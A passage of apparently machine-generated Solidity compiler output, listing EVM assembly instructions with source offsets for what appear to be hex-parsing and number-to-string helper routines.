											"begin": 9215,
											"end": 9223,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 9215,
											"end": 9223,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 9215,
											"end": 9223,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9166,
											"end": 9239,
											"name": "tag",
											"source": 0,
											"value": "92"
										},
										{
											"begin": 9166,
											"end": 9239,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 9087,
											"end": 9239,
											"name": "tag",
											"source": 0,
											"value": "90"
										},
										{
											"begin": 9087,
											"end": 9239,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 9007,
											"end": 9239,
											"name": "tag",
											"source": 0,
											"value": "87"
										},
										{
											"begin": 9007,
											"end": 9239,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 9264,
											"end": 9266,
											"name": "PUSH",
											"source": 0,
											"value": "61"
										},
										{
											"begin": 9258,
											"end": 9260,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 9258,
											"end": 9266,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 9258,
											"end": 9266,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 9258,
											"end": 9266,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 9258,
											"end": 9266,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 9257,
											"end": 9282,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 9257,
											"end": 9282,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 9257,
											"end": 9282,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "93"
										},
										{
											"begin": 9257,
											"end": 9282,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 9257,
											"end": 9282,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9278,
											"end": 9281,
											"name": "PUSH",
											"source": 0,
											"value": "66"
										},
										{
											"begin": 9272,
											"end": 9274,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 9272,
											"end": 9281,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 9272,
											"end": 9281,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 9272,
											"end": 9281,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 9272,
											"end": 9281,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 9257,
											"end": 9282,
											"name": "tag",
											"source": 0,
											"value": "93"
										},
										{
											"begin": 9257,
											"end": 9282,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 9253,
											"end": 9485,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 9253,
											"end": 9485,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "94"
										},
										{
											"begin": 9253,
											"end": 9485,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 9309,
											"end": 9311,
											"name": "PUSH",
											"source": 0,
											"value": "57"
										},
										{
											"begin": 9303,
											"end": 9311,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 9303,
											"end": 9311,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 9303,
											"end": 9311,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 9303,
											"end": 9311,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9253,
											"end": 9485,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "95"
										},
										{
											"begin": 9253,
											"end": 9485,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 9253,
											"end": 9485,
											"name": "tag",
											"source": 0,
											"value": "94"
										},
										{
											"begin": 9253,
											"end": 9485,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 9344,
											"end": 9346,
											"name": "PUSH",
											"source": 0,
											"value": "41"
										},
										{
											"begin": 9338,
											"end": 9340,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 9338,
											"end": 9346,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 9338,
											"end": 9346,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 9338,
											"end": 9346,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 9338,
											"end": 9346,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 9337,
											"end": 9361,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 9337,
											"end": 9361,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 9337,
											"end": 9361,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "96"
										},
										{
											"begin": 9337,
											"end": 9361,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 9337,
											"end": 9361,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9358,
											"end": 9360,
											"name": "PUSH",
											"source": 0,
											"value": "46"
										},
										{
											"begin": 9352,
											"end": 9354,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 9352,
											"end": 9360,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 9352,
											"end": 9360,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 9352,
											"end": 9360,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 9352,
											"end": 9360,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 9337,
											"end": 9361,
											"name": "tag",
											"source": 0,
											"value": "96"
										},
										{
											"begin": 9337,
											"end": 9361,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 9333,
											"end": 9485,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 9333,
											"end": 9485,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "97"
										},
										{
											"begin": 9333,
											"end": 9485,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 9388,
											"end": 9390,
											"name": "PUSH",
											"source": 0,
											"value": "37"
										},
										{
											"begin": 9382,
											"end": 9390,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 9382,
											"end": 9390,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 9382,
											"end": 9390,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 9382,
											"end": 9390,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9333,
											"end": 9485,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "98"
										},
										{
											"begin": 9333,
											"end": 9485,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 9333,
											"end": 9485,
											"name": "tag",
											"source": 0,
											"value": "97"
										},
										{
											"begin": 9333,
											"end": 9485,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 9423,
											"end": 9425,
											"name": "PUSH",
											"source": 0,
											"value": "30"
										},
										{
											"begin": 9417,
											"end": 9419,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 9417,
											"end": 9425,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 9417,
											"end": 9425,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 9417,
											"end": 9425,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 9417,
											"end": 9425,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 9416,
											"end": 9440,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 9416,
											"end": 9440,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 9416,
											"end": 9440,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "99"
										},
										{
											"begin": 9416,
											"end": 9440,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 9416,
											"end": 9440,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9437,
											"end": 9439,
											"name": "PUSH",
											"source": 0,
											"value": "39"
										},
										{
											"begin": 9431,
											"end": 9433,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 9431,
											"end": 9439,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 9431,
											"end": 9439,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 9431,
											"end": 9439,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 9431,
											"end": 9439,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 9416,
											"end": 9440,
											"name": "tag",
											"source": 0,
											"value": "99"
										},
										{
											"begin": 9416,
											"end": 9440,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 9412,
											"end": 9485,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 9412,
											"end": 9485,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 9412,
											"end": 9485,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 9467,
											"end": 9469,
											"name": "PUSH",
											"source": 0,
											"value": "30"
										},
										{
											"begin": 9461,
											"end": 9469,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 9461,
											"end": 9469,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 9461,
											"end": 9469,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 9461,
											"end": 9469,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9412,
											"end": 9485,
											"name": "tag",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 9412,
											"end": 9485,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 9333,
											"end": 9485,
											"name": "tag",
											"source": 0,
											"value": "98"
										},
										{
											"begin": 9333,
											"end": 9485,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 9253,
											"end": 9485,
											"name": "tag",
											"source": 0,
											"value": "95"
										},
										{
											"begin": 9253,
											"end": 9485,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 9519,
											"end": 9521,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 9514,
											"end": 9516,
											"name": "PUSH",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 9509,
											"end": 9511,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 9509,
											"end": 9516,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 9509,
											"end": 9521,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 9499,
											"end": 9522,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 9499,
											"end": 9522,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 9499,
											"end": 9522,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 9499,
											"end": 9522,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8874,
											"end": 8875,
											"name": "PUSH",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 8869,
											"end": 8875,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 8869,
											"end": 8875,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 8869,
											"end": 8875,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8869,
											"end": 8875,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8836,
											"end": 9534,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 8836,
											"end": 9534,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 8836,
											"end": 9534,
											"name": "tag",
											"source": 0,
											"value": "81"
										},
										{
											"begin": 8836,
											"end": 9534,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8836,
											"end": 9534,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9559,
											"end": 9564,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 9544,
											"end": 9565,
											"name": "SWAP5",
											"source": 0
										},
										{
											"begin": 9544,
											"end": 9565,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9544,
											"end": 9565,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9544,
											"end": 9565,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9544,
											"end": 9565,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9544,
											"end": 9565,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8633,
											"end": 9573,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 8633,
											"end": 9573,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8633,
											"end": 9573,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8633,
											"end": 9573,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 8368,
											"end": 8457,
											"name": "tag",
											"source": 0,
											"value": "55"
										},
										{
											"begin": 8368,
											"end": 8457,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8419,
											"end": 8423,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 8443,
											"end": 8449,
											"name": "PUSH",
											"source": 0,
											"value": "46DDF"
										},
										{
											"begin": 8436,
											"end": 8449,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8436,
											"end": 8449,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8368,
											"end": 8457,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8368,
											"end": 8457,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 10139,
											"end": 11154,
											"name": "tag",
											"source": 0,
											"value": "56"
										},
										{
											"begin": 10139,
											"end": 11154,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 10194,
											"end": 10207,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 10220,
											"end": 10230,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 10233,
											"end": 10234,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 10220,
											"end": 10234,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 10220,
											"end": 10234,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10245,
											"end": 10251,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 10254,
											"end": 10255,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 10245,
											"end": 10255,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 10245,
											"end": 10255,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10266,
											"end": 10337,
											"name": "tag",
											"source": 0,
											"value": "103"
										},
										{
											"begin": 10266,
											"end": 10337,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 10278,
											"end": 10279,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 10273,
											"end": 10274,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 10273,
											"end": 10279,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 10266,
											"end": 10337,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "104"
										},
										{
											"begin": 10266,
											"end": 10337,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 10296,
											"end": 10303,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 10296,
											"end": 10303,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 10296,
											"end": 10303,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 10296,
											"end": 10303,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 10296,
											"end": 10303,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 10296,
											"end": 10303,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10296,
											"end": 10303,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10323,
											"end": 10325,
											"name": "PUSH",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 10318,
											"end": 10325,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 10318,
											"end": 10325,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 10318,
											"end": 10325,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "105"
										},
										{
											"begin": 10318,
											"end": 10325,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 10318,
											"end": 10325,
											"name": "INVALID",
											"source": 0
										},
										{
											"begin": 10318,
											"end": 10325,
											"name": "tag",
											"source": 0,
											"value": "105"
										},
										{
											"begin": 10318,
											"end": 10325,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 10318,
											"end": 10325,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 10318,
											"end": 10325,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 10318,
											"end": 10325,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10266,
											"end": 10337,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "103"
										},
										{
											"begin": 10266,
											"end": 10337,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 10266,
											"end": 10337,
											"name": "tag",
											"source": 0,
											"value": "104"
										},
										{
											"begin": 10266,
											"end": 10337,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 10347,
											"end": 10363,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 10376,
											"end": 10381,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 10366,
											"end": 10382,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFF"
										},
										{
											"begin": 10366,
											"end": 10382,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 10366,
											"end": 10382,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 5,
											"end": 14,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "106"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 27,
											"end": 28,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 24,
											"end": 25,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 17,
											"end": 29,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"source": -1,
											"value": "106"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 10366,
											"end": 10382,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10366,
											"end": 10382,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 10366,
											"end": 10382,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 10366,
											"end": 10382,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 10366,
											"end": 10382,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 10366,
											"end": 10382,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 10366,
											"end": 10382,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 10366,
											"end": 10382,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 10366,
											"end": 10382,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 10366,
											"end": 10382,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 10366,
											"end": 10382,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 10366,
											"end": 10382,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 10366,
											"end": 10382,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 10366,
											"end": 10382,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 10366,
											"end": 10382,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 10366,
											"end": 10382,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 10366,
											"end": 10382,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 10366,
											"end": 10382,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 10366,
											"end": 10382,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 10366,
											"end": 10382,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 10366,
											"end": 10382,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 10366,
											"end": 10382,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "107"
										},
										{
											"begin": 10366,
											"end": 10382,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 10366,
											"end": 10382,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 10366,
											"end": 10382,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 10366,
											"end": 10382,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": 21,
											"end": 27,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 17,
											"end": 31,
											"name": "MUL",
											"source": -1
										},
										{
											"begin": 124,
											"end": 128,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 108,
											"end": 122,
											"name": "CALLDATASIZE",
											"source": -1
										},
										{
											"begin": 100,
											"end": 106,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 87,
											"end": 129,
											"name": "CALLDATACOPY",
											"source": -1
										},
										{
											"begin": 155,
											"end": 159,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 147,
											"end": 153,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 143,
											"end": 160,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 133,
											"end": 160,
											"name": "SWAP2",
											"source": -1
										},
										{
											"begin": 133,
											"end": 160,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 0,
											"end": 164,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 10366,
											"end": 10382,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 10366,
											"end": 10382,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10366,
											"end": 10382,
											"name": "tag",
											"source": 0,
											"value": "107"
										},
										{
											"begin": 10366,
											"end": 10382,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 10366,
											"end": 10382,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10347,
											"end": 10382,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 10347,
											"end": 10382,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10398,
											"end": 10404,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 10405,
											"end": 10406,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 10398,
											"end": 10406,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 10398,
											"end": 10406,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10393,
											"end": 10537,
											"name": "tag",
											"source": 0,
											"value": "108"
										},
										{
											"begin": 10393,
											"end": 10537,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 10410,
											"end": 10415,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 10408,
											"end": 10409,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 10408,
											"end": 10415,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 10393,
											"end": 10537,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 10393,
											"end": 10537,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "109"
										},
										{
											"begin": 10393,
											"end": 10537,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 10445,
											"end": 10447,
											"name": "PUSH",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 10441,
											"end": 10442,
											"name": "DUP7",
											"source": 0
										},
										{
											"begin": 10441,
											"end": 10447,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 10441,
											"end": 10447,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "111"
										},
										{
											"begin": 10441,
											"end": 10447,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 10441,
											"end": 10447,
											"name": "INVALID",
											"source": 0
										},
										{
											"begin": 10441,
											"end": 10447,
											"name": "tag",
											"source": 0,
											"value": "111"
										},
										{
											"begin": 10441,
											"end": 10447,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 10441,
											"end": 10447,
											"name": "MOD",
											"source": 0
										},
										{
											"begin": 10437,
											"end": 10447,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 10437,
											"end": 10447,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10483,
											"end": 10503,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "112"
										},
										{
											"begin": 10500,
											"end": 10501,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 10483,
											"end": 10493,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "113"
										},
										{
											"begin": 10483,
											"end": 10503,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 10483,
											"end": 10503,
											"name": "tag",
											"source": 0,
											"value": "112"
										},
										{
											"begin": 10483,
											"end": 10503,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 10462,
											"end": 10465,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 10478,
											"end": 10479,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 10474,
											"end": 10475,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 10466,
											"end": 10471,
											"name": "DUP8",
											"source": 0
										},
										{
											"begin": 10466,
											"end": 10475,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 10466,
											"end": 10479,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 10462,
											"end": 10480,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 10462,
											"end": 10480,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 10462,
											"end": 10480,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 10462,
											"end": 10480,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 10462,
											"end": 10480,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "114"
										},
										{
											"begin": 10462,
											"end": 10480,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 10462,
											"end": 10480,
											"name": "INVALID",
											"source": 0
										},
										{
											"begin": 10462,
											"end": 10480,
											"name": "tag",
											"source": 0,
											"value": "114"
										},
										{
											"begin": 10462,
											"end": 10480,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 10462,
											"end": 10480,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 10462,
											"end": 10480,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 10462,
											"end": 10480,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 10462,
											"end": 10503,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 10462,
											"end": 10503,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 10462,
											"end": 10503,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 10462,
											"end": 10503,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 10462,
											"end": 10503,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 10462,
											"end": 10503,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 10462,
											"end": 10503,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 10462,
											"end": 10503,
											"name": "BYTE",
											"source": 0
										},
										{
											"begin": 10462,
											"end": 10503,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 10462,
											"end": 10503,
											"name": "MSTORE8",
											"source": 0
										},
										{
											"begin": 10462,
											"end": 10503,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10523,
											"end": 10525,
											"name": "PUSH",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 10518,
											"end": 10525,
											"name": "DUP7",
											"source": 0
										},
										{
											"begin": 10518,
											"end": 10525,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 10518,
											"end": 10525,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "115"
										},
										{
											"begin": 10518,
											"end": 10525,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 10518,
											"end": 10525,
											"name": "INVALID",
											"source": 0
										},
										{
											"begin": 10518,
											"end": 10525,
											"name": "tag",
											"source": 0,
											"value": "115"
										},
										{
											"begin": 10518,
											"end": 10525,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 10518,
											"end": 10525,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 10518,
											"end": 10525,
											"name": "SWAP6",
											"source": 0
										},
										{
											"begin": 10518,
											"end": 10525,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10417,
											"end": 10420,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 10417,
											"end": 10420,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 10417,
											"end": 10420,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 10417,
											"end": 10420,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 10417,
											"end": 10420,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10393,
											"end": 10537,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "108"
										},
										{
											"begin": 10393,
											"end": 10537,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 10393,
											"end": 10537,
											"name": "tag",
											"source": 0,
											"value": "109"
										},
										{
											"begin": 10393,
											"end": 10537,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 10393,
											"end": 10537,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10547,
											"end": 10561,
											"name": "PUSH",
											"source": 0,
